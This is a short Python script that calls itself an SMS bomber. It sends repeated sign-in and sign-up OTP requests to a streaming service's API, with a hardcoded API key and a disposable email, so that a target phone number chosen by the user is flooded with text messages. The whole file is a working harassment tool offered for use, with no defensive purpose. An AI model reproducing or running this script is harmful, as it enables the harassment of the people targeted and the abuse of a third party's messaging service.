#!/usr/bin/env python3

import requests as rq

"""
SMS Bomber using Hoichoi SMS api
"""

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-cd350637-12f8-87ed-010a-5cf9cd4d236b"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"fafex40451@zcai77.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input("[*] Target Number: ")
  amount = int(input("[*] Total Amount of SMS to send: "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"[ID: {i}] SMS Sent!")
        sent += 1
        nsent -= 1
      else:
        print(f"[ID: {i}] SMS Not Sent...")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Target: {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")

if __name__ == "__main__":
  main()